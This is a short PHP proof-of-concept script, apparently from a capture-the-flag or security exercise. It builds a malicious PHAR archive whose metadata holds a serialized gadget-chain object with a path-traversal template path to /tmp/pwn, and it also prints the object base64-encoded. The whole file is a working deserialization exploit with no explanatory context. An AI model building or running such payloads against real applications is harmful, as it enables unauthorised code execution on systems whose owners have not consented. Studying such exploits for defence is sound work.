<?php

require("./gadget.php");

@unlink("payload.phar");

// create new Phar
$phar = new Phar('payload.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub("<?php __HALT_COMPILER(); ?>");


// render /tmp/pwn.php
$object = new \App\Models\UserModel((new \Template("../../../../../../../../tmp/pwn")));

echo base64_encode(serialize($object));

$poc = new Phar("payload.phar");
$poc->startBuffering();
$poc->setStub("<?php echo 'Here is the STUB!'; __HALT_COMPILER();");
$poc["file"] = "text";
$poc->setMetadata($object);
$poc->stopBuffering();
